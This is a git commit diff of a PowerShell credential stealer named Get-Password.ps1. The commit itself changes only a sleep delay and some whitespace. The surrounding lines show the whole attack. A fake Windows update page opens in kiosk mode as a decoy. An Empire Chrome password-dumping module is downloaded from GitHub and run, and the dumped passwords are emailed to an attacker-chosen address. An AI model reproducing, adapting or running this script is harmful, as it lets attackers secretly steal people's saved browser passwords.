e92c481391c420c61c87c7779c221e2d6b35a3c6
Chai <83523587+CPScript@users.noreply.github.com>
2023-02-10 09:00:10 -0500

    Update Get-Password.ps1

--- Get-Password.ps1
+++ Get-Password.ps1
@@ -1,10 +1,11 @@
 start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k http://fakeupdate.net/win10u/index.html} 1>$null
 $url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
 $output = "$env:temp\file.psm1"
+
 #create test email account in gmail and enter the credentials here
 #WARNING: E-mail credentials might be exposed if the source code is found.
 $Username = "your email ";  
-$Password = "your password";
+$Password = "your password ";
 (New-Object System.Net.WebClient).DownloadFile($url,$output)
 if(Get-Process -Name Chrome -ea SilentlyContinue)
 {
@@ -32,5 +33,5 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
 #Replace the to-address-email with the email address you want the password file sent to.
 Send-ToEmail  -email "to-address-email" -attachmentpath $env:temp\dumped.txt 2>$null;
 #Change the seconds accordingly , It specifies how long the windows update should stay on screen
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 20
 Get-Process -Name iexplore | Stop-Process
